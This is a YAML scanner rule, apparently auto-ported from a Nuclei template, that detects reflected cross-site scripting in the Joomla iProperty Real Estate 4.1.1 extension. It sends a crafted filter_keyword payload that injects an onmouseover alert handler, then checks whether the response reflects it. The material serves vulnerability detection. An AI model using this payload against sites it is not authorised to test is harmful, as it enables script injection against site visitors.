schema_version: 1
id: "cortex.community:joomla-iproperty-xss"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Joomla iProperty Real Estate 4.1.1 - Cross-Site Scripting"
  description: "Joomla extension iproperty is vulnerable to XSS in GET parameter 'filter_keyword'. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.exploit-db.com/exploits/51640"
    - "https://cxsecurity.com/issue/WLB-2023070076"
    - "https://extensions.joomla.org/extension/vertical-markets/real-estate/iproperty/"
  tags: ["joomla", "xss", "unauth", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Medium"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/iproperty/property-views/all-properties-with-map?filter_keyword=pihil%22onmouseover=%22alert(document.domain)%22style=%22position:absolute;width:100%;height:100%;top:0;left:0;%22f63m4&option=com_iproperty&view=allproperties&ipquicksearch=1" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "onmouseover=\"alert(document.domain)\"style=" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "real estate" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
